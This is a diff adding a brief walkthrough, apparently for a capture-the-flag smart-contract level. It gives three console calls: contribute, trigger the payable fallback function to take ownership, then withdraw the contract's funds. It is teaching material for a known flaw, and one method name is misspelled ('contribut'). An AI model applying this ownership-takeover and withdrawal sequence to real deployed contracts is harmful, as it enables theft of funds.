@@ -1,0 +1,7 @@
+Level 1 is to claim ownership of the contract:
+
+Follow this steps:
+
+1. Try to contribute by calling await contract.contribut({from: player, value:toWei(0.0009)})
+2. Trigger the anonymous(payable) function by calling await sendTransaction({value: toWei(0.0009), to: instance, from: player, data: "0x9999"})
+3. Calling await contract.withdraw();
